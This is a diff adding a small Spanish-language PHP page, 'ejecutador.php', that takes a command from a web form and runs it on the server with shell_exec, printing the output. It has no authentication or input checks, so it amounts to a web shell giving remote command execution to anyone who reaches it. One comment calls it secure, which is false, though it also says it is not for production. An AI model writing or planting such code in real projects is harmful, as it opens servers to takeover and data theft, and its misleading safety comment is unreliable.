@@ -1,0 +1,30 @@
+<?php
+// ejecutador.php
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $comando = $_POST['comando'] ?? '';
+
+    if (!empty($comando)) {
+        // Ejecutar el comando de forma segura (esto es un ejemplo básico, ¡no para producción!)
+        $salida = shell_exec($comando . ' 2>&1');
+        echo "<pre>$salida</pre>";
+    } else {
+        echo "No se recibió ningún comando.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Ejecutador de Comandos</title>
+</head>
+<body>
+    <h1>Ejecutador de Comandos</h1>
+    <form method="post">
+        <input type="text" name="comando" placeholder="Escribe un comando">
+        <button type="submit">Ejecutar</button>
+    </form>
+</body>
+</html>
